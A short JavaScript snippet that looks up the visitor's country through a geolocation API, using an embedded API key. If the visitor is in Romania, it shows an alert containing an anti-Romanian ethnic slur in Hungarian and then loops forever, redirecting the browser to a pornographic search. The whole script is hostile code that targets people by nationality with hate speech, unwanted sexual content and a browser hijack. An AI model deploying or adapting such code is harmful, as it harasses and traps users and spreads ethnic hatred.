fetch('https://api.geoapify.com/v1/ipinfo?apiKey=8c80401505ff4b0abee56fcf7e8191cb')
  .then(response => response.json())
  .then(data => {
    console.log(data.country.iso_code);
    if (data.country.iso_code.toLowerCase() == "ro") {
      alert("ERDÉLY MAGYAR FÖLD ROMÁN GECI!!!!!!!");
      while (true) {
        window.location = "https://www.google.com/search?q=gay+furry+porn";
      }
    }
  });